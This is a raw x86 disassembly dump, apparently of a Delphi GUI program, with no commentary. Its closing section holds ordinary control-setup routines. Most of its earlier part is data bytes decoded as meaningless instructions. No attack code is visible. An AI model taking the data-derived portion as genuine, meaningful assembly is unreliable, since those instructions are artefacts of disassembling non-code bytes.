imul ecx [ eax ] 0x43
test eax 0xae073403
inc ebx
outsd
insd
jo r-xdata
cwde
jbe r-xdata
jae r-xdata
stosd [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebp esp
add ecx [ edx + edi * 2 ]
stosd [ edi ]
add ebp [ eax - 0x53fc5515 ]
jmp r-xdata
inc ecx
stosd [ edi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add ebp [ eax - 0x7d ]
stosd [ edi ]
add ebp esp
insb
jae r-xdata
add ebp [ edx + edx * 2 ]
test al 0x3
fadd [ ebp - 0x5a ]
dec esp
inc ebx
je r-xdata
imul ebp [ esi + 0x67 ] 0x6d6f4308
imul ebp [ edi + 0x6e ] 0x1
add [ esi ] al
je r-xdata
add ebp [ eax + 0x78 ]
lodsd [ esi ]
add esi eax
add al [ eax ]
add [ edi + edi + 0x3df003a9 ] ch
test al 0x3
je r-xdata
jb r-xdata
js r-xdata
arpl [ ebx + 0x45 ] si
jae r-xdata
inc ebx
outsd
outsd
imul ebp [ ebp + 0x70 ] 0x6310656c
jae r-xdata
push ebp
lodsd [ esi ]
add eax [ eax + 0x3ad78 ]
add edx [ eax + r-xdata ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x78
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dh
js r-xdata
add eax [ eax ]
popad
bound edx [ 0x556f6361 ]
jo r-xdata
push esp
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
aas
test eax 0xa83df003
add edx esp
inc ebp
dec ebx
jns r-xdata
insb
jae r-xdata
lodsd [ esi ]
add esi esp
add [ esi + 0x43540d03 ] ebp
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
sbb al 0x28
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ebp eax
sub al 0xab
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
xor al 0x7
popad
add eax [ esi ]
adc al 0x54
je r-xdata
or eax 0x416f6361
add al 0xae
add ebx [ eax - 0x13fc5478 ]
jne r-xdata
cld
inc ecx
jne r-xdata
rcr [ eax + 0x603ad76 ] 0x14
push esp
scasb [ edi ]
push 0x3403a983
pop es
dec edi
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 ] ah
imul di [ eax + 0x65 ] 0x973
popad
arpl [ edi + 0x55 ] bp
cmp [ eax - 0x53 ] 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
jb r-xdata
jb r-xdata
outsd
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
les eax [ ebx ]
scasb [ edi ]
add edi [ edx + eax * 4 - 0x7737fc55 ]
stosd [ edi ]
add edx [ eax + ecx * 4 ]
stosd [ edi ]
add ebp [ eax - 0x14 ]
stosb [ edi ]
add eax [ eax - 0x5ffc5483 ]
jge r-xdata
test al 0x3
imul ebp [ edi + 0x6e ] 0x75fc0173
lodsd [ esi ]
aam 0x45
jo r-xdata
inc ebx
je r-xdata
outsd
insd
outsb
jae r-xdata
add [ eax ] al
add [ ebp - 0x53 ] dh
je r-xdata
mov ebp 0xbe3c03a7
cmpsd [ esi ] [ edi ]
add edi [ ebx + edx - 0x52 ]
add edi [ eax + eax * 8 - 0x59 ]
add edx esp
shl [ edi - 0x583e93fd ] 0x3
cld
adc ebp [ esi - 0x51ebfbfd ]
add edx [ edx ]
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
mov eax 0xe803a7bd
add edi [ eax + 0x3f ]
test eax 0x8000003
inc ebx
outsd
insd
inc ebx
je r-xdata
sub_3ad7947
add esi esp
and al 0xab
add esp [ eax ]
and eax 0xede803ab
stosb [ edi ]
add edx [ ecx + edi * 8 - 0x56 ]
add esp esp
in eax dx
stosb [ edi ]
add esp eax
cli
stosb [ edi ]
add ebp eax
xchg ecx eax
stosd [ edi ]
add ecx eax
mov [ ebx - 0x5477ebfd ] ch
add edx [ esi + esi * 2 ]
stosd [ edi ]
add eax [ ebx + edi * 2 ]
add ebp [ eax - 0x14 ]
stosb [ edi ]
add eax [ eax - 0x5ffc5483 ]
jge r-xdata
stosd [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebp esp
add ecx [ edx + edi * 2 ]
stosd [ edi ]
add ebp [ eax - 0x53fc5515 ]
jmp r-xdata
stosd [ edi ]
add esp [ eax + 0x1c03aafd ]
cld
stosb [ edi ]
add ebp esp
push es
scasb [ edi ]
add esp [ ebp + 0x7a6003ab ]
stosd [ edi ]
add esp [ eax ]
jpo r-xdata
add ebx eax
push esp
stosd [ edi ]
add ebx [ eax + edx * 4 ]
stosd [ edi ]
add edi [ eax + edi * 2 - 0x6e93fc55 ]
stosd [ edi ]
add esi [ ebx + edi * 2 - 0x79cbfc55 ]
test eax 0xa9793003
add ebx [ ecx + edi * 2 - 0x57 ]
add al 0xae
add ebx [ eax - 0x13fc5478 ]
inc ecx
stosd [ edi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add ebp [ eax - 0x7d ]
test eax 0xae073403
add ebp eax
sub al 0xab
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
les eax [ ebx ]
scasb [ edi ]
add edi [ edx + eax * 4 - 0x7737fc55 ]
stosd [ edi ]
add edx [ eax + ecx * 4 ]
stosd [ edi ]
test [ eax - 0x57 ] bh
add edx [ eax - 0x57fc51f3 ]
nop
stosd [ edi ]
add ecx [ esp + edi * 2 - 0x55 ]
add esp [ esp + ecx ]
scasb [ edi ]
add ecx [ eax - 0x27fc51f3 ]
jns r-xdata
jl r-xdata
dec esp
add ebx [ eax ]
or al 0xae
add eax [ eax + 0xd ]
scasb [ edi ]
add ecx [ ebp + eax * 4 - 0x57 ]
add ecx [ ebx ]
push esp
outsb
js r-xdata
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add esi [ edx + eax + 0xf50ff00 ]
scasb [ edi ]
add eax [ ecx ]
add [ eax ] al
push cs
add [ ebx ] dl
inc ecx
jne r-xdata
add ebx [ ebx ]
add bh bh
add al 0xef
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x6c410500
imul esp [ edi + 0x6e ] r-xdata
mov ah 0x2
add bh bh
push eax
fxsave [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x2 ] al
jpe r-xdata
test al 0x8d
outsd
inc ebx
outsd
insd
jo r-xdata
pop esp
jns r-xdata
add eax [ edi ]
or edx [ ebx + eax * 2 + 0x6f ]
arpl [ ecx + ebp * 2 + 0x6f ] si
adc [ edx ] 0x0
stosb [ edi ]
add edx [ ebp + ebp * 8 + 0x3aa ]
add [ eax + 0x3 ] al
adc eax [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
inc ebp
je r-xdata
stosd [ edi ]
add esp [ eax + 0x2d ]
stosd [ edi ]
add ebp [ eax ]
xor eax 0x435403ab
stosd [ edi ]
add esi [ ebp + eax + 0x402c03ae ]
stosd [ edi ]
add edx eax
or [ esi - 0x54bc13fd ] ch
add edx [ eax ]
inc esp
stosd [ edi ]
add esp [ esp + eax * 2 + 0x788403ab ]
test eax 0xae0d9003
add ebp [ eax + 0x4c03ab90 ]
add al 0x7b
add ebx [ esi + eax * 4 + 0x785803a9 ]
test eax 0xa9857003
add edi [ ebp + eax * 4 - 0x57 ]
add ecx [ eax ]
xchg [ ecx - 0x5429abfd ] ch
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
js r-xdata
stosd [ edi ]
add edi [ eax ]
jle r-xdata
pop esp
je r-xdata
or al 0xae
add eax [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4907000f ] al
je r-xdata
lea esp [ edi + 0x3c03 ]
je r-xdata
dec edi
jo r-xdata
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
push esp
inc ebx
outsd
js r-xdata
mov eax 0x7003a873
add [ eax ] al
[ eax ]
add eax [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050017 ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
pop es
push ebx
add ebx [ edi ]
add bh bh
je r-xdata
outsb
insb
lahf
stosb [ edi ]
add esp [ ecx ]
add bh bh
js r-xdata
outsd
insd
jae r-xdata
add eax [ eax ]
add [ eax ] al
add [ 0x15ff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
js r-xdata
insb
inc ebp
push es
inc ecx
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al [ eax ]
imul ebp [ edi + 0x6e ] 0xad73c073
add ebx esp
add al [ eax ]
[ esp + ecx ]
add ebp [ eax - 0x6ffc5688 ]
test [ ecx - 0x5682cbfd ] ch
add ecx [ eax ]
jpo r-xdata
test [ ecx - 0x5679f7fd ] ebp
add edx [ esi + edx * 8 - 0x55 ]
add edi [ eax + edi * 2 - 0x53 ]
add eax [ edx ]
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add [ gs : eax ] dl
xor eax [ esp + esi * 4 - 0x6a ]
stosb [ edi ]
add edi [ esi ]
add bh bh
jle r-xdata
add dh bh
lodsb [ esi ]
cld
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080014 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xb865646f
jae r-xdata
cmpsd [ esi ] [ edi ]
add edi [ eax + eax ]
add dh bh
sbb ch ch
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
js r-xdata
add [ eax ] al
adc [ esi ] 0x0
or eax [ ebx + 0x6f ]
outsb
jae r-xdata
mov al [ 0x7403aa ]
add bh bh
pop esp
daa
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0016 ] al
outsd
inc ebp
insb
jae r-xdata
sbb [ edi ] 0x0
or cl [ ecx + 0x74 ]
insd
dec eax
imul esp [ gs : edi + 0x68 ] 0xa6103c74
add edx [ edx + eax ]
[ eax + 0x103a979 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] al
or [ ebp + 0x61 ] ecx
js r-xdata
test al 0x3
push 0x7cff0000
cld
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] al
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41060012 ] al
add esi [ eax ]
add bh bh
sub ch bh
stosb [ edi ]
add esi [ ebp + edi * 8 - 0x56 ]
jne r-xdata
cmpsb [ esi ] [ edi ]
add edx [ eax ]
add dh bh
push 0x84fe0000
and ch [ ebx + 0x3 ]
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jo r-xdata
add bh bh
add [ fs : eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
add [ eax ] al
add al [ eax ]
add ah cl
xchg esi eax
stosb [ edi ]
outsb
je r-xdata
outsb
je r-xdata
mov al 0xaa
add edi [ eax - 0x4700ffff ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
sbb eax 0x6d490700
dec ebp
outsd
push eax
mov cl 0xaa
add edi [ ecx + eax + 0x1bcff00 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ edi ] al
dec ecx
insd
dec esi
popad
insd
cmp al 0x10
cmpsb [ esi ] [ edi ]
add edx [ eax ]
add [ eax ] eax
jae r-xdata
xchg esp eax
jbe r-xdata
add ebx eax
add al [ eax ]
jmp [ edi + eax - 0x52 ]
sbb [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax + eax ]
imul ebp [ esi + 0x74 ] 0xa6100073
add ebx ecx
add [ eax ] eax
call [ esi + edi * 2 ]
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
add [ ebx ] cl
push eax
popad
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add esp [ eax ]
add bh bh
jo r-xdata
add bh bh
jl r-xdata
jb r-xdata
add [ eax - 0x80000000 ] al
daa
add [ eax ] cl
push ebx
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
jb r-xdata
adc [ esi + 0x1dd03 ] ah
inc [ esi + edi * 2 - 0x55 ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
or edx [ eax + 0x61 ]
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
push eax
outsb
je r-xdata
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
and [ eax ] eax
push cs
push eax
popad
jb r-xdata
stosb [ edi ]
add ecx [ esp + edi * 8 + 0x3aa ]
add [ eax - 0x80000000 ] al
sbb al 0x0
add al 0x46
outsd
outsb
je r-xdata
stosd [ edi ]
sahf
stosb [ edi ]
add ecx [ edi - 0x70010000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
imul ebp [ esi + 0x74 ] r-xdata
jo r-xdata
sahf
stosb [ edi ]
add esi [ eax + 0x7e ]
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
mov eax 0x103aafb
jo r-xdata
push cs
push eax
popad
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
or dl [ eax + 0x61 ]
outsb
je r-xdata
insb
cld
stosd [ edi ]
imul ebp [ esi + 0x74 ] r-xdata
add [ eax ] 0x0
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
adc [ esi + 0x8e03 ] ah
add [ eax ] eax
inc [ ebx ]
stosd [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002e ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
jne r-xdata
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add edx [ edi ]
add bh bh
test al 0xfa
stosb [ edi ]
add esp esp
and ch [ ebx + 0x3 ]
add [ ecx ] 0x0
add [ eax ] al
sub eax [ eax ]
pop es
fadd [ ecx ]
add bh bh
or [ edi - 0x55 ] bh
add eax [ ecx ]
outsb
jne r-xdata
outsb
je r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
cmpsb [ esi ] [ edi ]
add ebx [ ecx ]
add bh bh
mov ah 0xfc
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ ebx ] ah
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ esi + 0x5a03 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub [ eax ] eax
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add esp eax
add al [ eax ]
jmp eax
add [ eax ] al
add [ eax + 0x4f0a0032 ] al
outsb
inc esp
jb r-xdata
js r-xdata
js r-xdata
add [ eax ] al
sub [ edx ] 0x0
add al 0x54
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404002a ] al
lahf
stosb [ edi ]
add ecx [ eax - 0x47fc5505 ]
sti
stosb [ edi ]
add eax [ ecx ]
adc [ esi + 0x8d03 ] ah
jle r-xdata
push 0x6948776f
outsb
je r-xdata
add [ eax ] 0x0
dec edi
cld
push eax
outsd
add esi eax
jle r-xdata
jb r-xdata
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax 0x61500e00
daa
stosb [ edi ]
add eax [ eax + 0x3cff0000 ]
sti
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090026 ] al
dec ebx
jns r-xdata
cld
jne r-xdata
outsb
dec edi
jb r-xdata
add [ edx ] cl
dec edi
add esi [ eax + 0x2 ]
add bh bh
jo r-xdata
add al [ eax ]
push [ eax + 0x2 ]
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax + 0x4f090034 ] al
outsb
add esi eax
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070037 ] al
outsb
inc ebp
outsb
jbe r-xdata
jne r-xdata
inc ebp
outsb
inc ebp
imul esi [ fs : eax + ebp * 2 - 0x5a ] 0xf803aa
add bh bh
clc
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x0
or [ edi + 0x6e ] ecx
inc esp
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or cl [ edi + 0x6e ]
add bh bh
popad
jo r-xdata
jo r-xdata
jne r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003e ] al
outsb
push ebx
je r-xdata
jo r-xdata
jne r-xdata
cld
movsb [ edi ] [ esi ]
stosb [ edi ]
add edx [ eax ]
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003a ] al
outsb
jns r-xdata
jb r-xdata
push 0xf803aaa6
add [ eax ] al
jo r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x68 ] bp
cmpsb [ esi ] [ edi ]
stosb [ edi ]
add ecx [ eax ]
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
outsd
ja r-xdata
sub eax 0x6e4f0800
inc ebx
push 0x65676e61
cld
jne r-xdata
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or cl [ edi + 0x6e ]
add ebx [ eax ]
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0030 ] al
or [ eax ] al
add [ eax ] al
inc ecx
add [ 0x706f7244 ] cl
inc esp
outsd
ja r-xdata
jb r-xdata
mov al 0xa4
stosb [ edi ]
add ecx [ eax ]
add al [ eax ]
dec [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090039 ] al
outsb
mov [ 0xc803aa ] eax
add bh bh
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
dec ebx
jns r-xdata
cmp [ edx ] 0x0
or cl [ edi + 0x6e ]
add ebp [ eax + 0x2 ]
add bh bh
push 0x1ff0002
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08003d ] al
push 0x68ff0002
add al [ eax ]
inc [ ecx ]
jb r-xdata
je r-xdata
jne r-xdata
inc esp
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0a0033 ] al
outsb
movsd [ edi ] [ esi ]
stosb [ edi ]
add esp eax
add [ eax ] al
jmp eax
cmpsd [ esi ] [ edi ]
cld
jne r-xdata
push esi
imul esi [ ebx + 0x69 ] 0xfc656c62
add [ eax ] al
add [ ebx ] ch
add [ edi ] al
add edx [ eax ]
add [ eax ] eax
call [ eax ]
test al 0x3
jl r-xdata
inc ebx
outsd
jne r-xdata
inc eax
add [ eax ] al
sub [ ebp + 0x3 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
sbb al 0xe8
stosd [ edi ]
add ecx eax
add al [ eax ]
[ esi + eax ]
dec ebp
outsd
jbe r-xdata
outsb
push ebx
insb
arpl [ gs : eax + ebp - 0x58 ] si
stosb [ edi ]
add esi eax
add [ eax ] al
push eax
add [ eax ] al
dec edi
jae r-xdata
add [ eax + 0x4f090035 ] al
add [ eax ] al
add edi eax
add [ eax ] eax
inc esp
jb r-xdata
add [ edx ] cl
dec edi
outsb
add ebp eax
add al [ eax ]
sub [ ebx - 0x55169bfd ] ebp
add esp [ ecx + ebp * 8 - 0x1773fc56 ]
stosb [ edi ]
add esi [ ebx + ecx ]
lodsb [ esi ]
add edi [ eax ]
or ebp [ ebx + eax + sub_3aae8b0 ]
adc al 0xe7
stosb [ edi ]
add ebx [ edi - 0x56 ]
add ebp [ eax - 0x4ffc5519 ]
in eax 0xaa
add esp [ eax + ebp * 8 - 0x56 ]
add ecx [ eax - 0x3bfc5518 ]
jmp 0x36e18640
test al 0x3
mov al [ 0x5c03aae6 ]
or ch [ ebx + eax + sub_3aae728 ]
test [ edx ] cl
lodsb [ esi ]
add esp eax
sub [ ebx - 0x551703fd ] ebp
add esi [ eax - 0x19 ]
stosb [ edi ]
add edx esp
or ch [ ebx + eax + sub_3ac0ae8 ]
call 0x13b12d30
or ebp [ ebx + eax + sub_3aae844 ]
sbb [ ebx ] cl
lodsb [ esi ]
add ebp [ eax - 0x18 ]
stosb [ edi ]
add esp [ eax ]
or ebp [ ebx + eax + sub_3ab29e8 ]
jmp 0xffffffffed518610
je r-xdata
add [ eax ] al
add [ ebp - 0x53 ] ch
add ecx eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2803ad82 ] dh
jb r-xdata
outsb
push ebx
je r-xdata
cld
[ eax ] al
mov al 0xa4
stosb [ edi ]
add ebx [ eax ]
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003b ] al
outsd
arpl [ ebx + 0x20 ] bp
cmpsb [ esi ] [ edi ]
stosb [ edi ]
add eax [ eax ]
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebx esp
test al 0x3
mov esp 0x1003ab29
aas
test al 0x3
sbb al 0xe8
stosb [ edi ]
add esi [ ebx + esi - 0x53 ]
add edx eax
call 0x424185c0
test al 0x3
sub [ edi ] bh
sub [ eax ] al
add [ eax ] al
insb
and eax 0x45c803ad
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x82
lodsd [ esi ]
add ebp [ eax ]
sub_3ad82e0
push ebx
add esp 0xfffffff8
mov [ esp ] 0x8
mov [ esp + 0x4 ] eax
mov eax esp
call sub_3a86894
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
jne r-xdata
mov eax ebx
pop ecx
pop edx
pop ebx
retn
call InitCommonControls
sub_3ad830c
push ebx
mov ebx eax
mov eax ebx
call sub_3ad82e0
test al al
jne r-xdata
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
sub_3ad8334
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x10 ] 0x32
mov [ esi + 0x15 ] 0x1
mov [ esi + 0x17 ] 0x1
xor edx edx
mov eax esi
call sub_3a7ae30
mov eax esi
call sub_3ad840c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ad8380
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_3a7aad0
mov edi esi
mov edx [ edi + 0xc ]
mov eax ebx
call sub_3ad84cc
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_3ad84f4
movzx edx [ edi + 0x14 ]
mov eax ebx
call sub_3ad849c
movzx edx [ edi + 0x15 ]
mov eax ebx
call sub_3ad84ac
movzx edx [ edi + 0x18 ]
mov eax ebx
call sub_3ad84bc
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_3ad840c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x17 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_3a6457c
test eax eax
je r-xdata
mov eax ebx
mov si 0xffff
call sub_3a6457c
mov eax [ eax + 0x18 ]
movzx edx [ eax + 0x5f ]
mov eax ebx
call sub_3ad83e0
mov [ ebx + 0x17 ] 0x1
sub_3ad8478
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0xc ]
call sub_3a652f4
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_3a7aed4
sub_3ad84cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx esi
call sub_3a656c8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0xc ]
mov edx esi
call sub_3a652f4
xor edx edx
mov eax ebx
call sub_3a7ae98
sub_3ad8504
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_3a7b014
mov eax esi
mov edx [ eax ]
call [ edx + 0xe4 ]
mov ecx eax
xor edx edx
mov eax edi
call sub_3a7b014
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
sub_3ad8588
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebx + 0x18 ]
call sub_3ad8d5c
pop esi
pop ebx
retn
mov eax esi
call sub_3a7aebc
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x18 ]
call sub_3ad8bd0
pop esi
pop ebx
retn
sub_3ad85b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_3ab29f0
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0xff00000f
mov eax ebx
call sub_3aafd28
mov edx 0x13
mov eax ebx
call sub_3aaf2ac
mov dl 0x2
mov eax ebx
call sub_3aaef04
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
mov [ ebx + 0x250 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a89cb0
mov esi eax
mov [ ebx + 0x254 ] esi
mov eax esi
mov edx ebx
call sub_3aae42c
mov [ ebx + 0x25d ] 0x1
xor edx edx
mov eax ebx
call sub_3aafcb4
mov [ ebx + 0x25f ] 0x1
mov eax ebx
call sub_3ad8ba0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_3a6473c
